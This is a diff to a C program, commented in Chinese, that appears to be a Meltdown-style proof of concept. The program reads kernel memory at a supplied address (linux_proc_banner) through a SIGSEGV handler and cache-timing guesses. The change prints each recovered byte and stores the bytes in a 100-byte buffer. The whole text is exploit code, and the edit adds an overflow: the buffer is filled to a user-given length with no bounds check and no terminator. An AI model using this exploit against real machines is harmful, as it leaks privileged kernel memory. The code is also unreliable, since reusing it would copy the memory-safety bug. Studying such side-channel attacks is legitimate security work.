@@ -111,11 +111,12 @@ int main(int argc, const char* * argv){
     signal(SIGSEGV,deal_segmentation);//注册SIGSEGV信号的捕获函数
     int score[256]={};
     char* addr;
+    char buf[100];
     int tmp,len;
     int fd = open("/proc/version", O_RDONLY);//打开一个文件，暂时不知道有什么作用，参考的是proc里的代码。如果没有
                                             //会失败。猜测和数组存入cache有关
     sscanf(argv[1],"%lx",&addr);//melt.sh传来了linux_proc_banner的地址
-    sscanf(argv[2],"%d",&len);//读取100个字节的值
+    sscanf(argv[2],"%d",&len);//读取指定数量的字节
     printf("读取该地址：%lx后%d长度的内容\n",addr,len);
     for (int j=0;j<len;j++){
         memset(score,0,sizeof(score));
@@ -123,8 +124,9 @@ int main(int argc, const char* * argv){
             score[readbyte(fd,addr)]++;//猜测的值加1
         }
         tmp=max(score);
-        printf("%c",tmp);  
+        printf("%d:%c\n",j,tmp);  
+        buf[j]=tmp;
         addr++;      
     }
-    printf("\n");
+    printf("读取的全内容为\n%s\n",buf);
 }
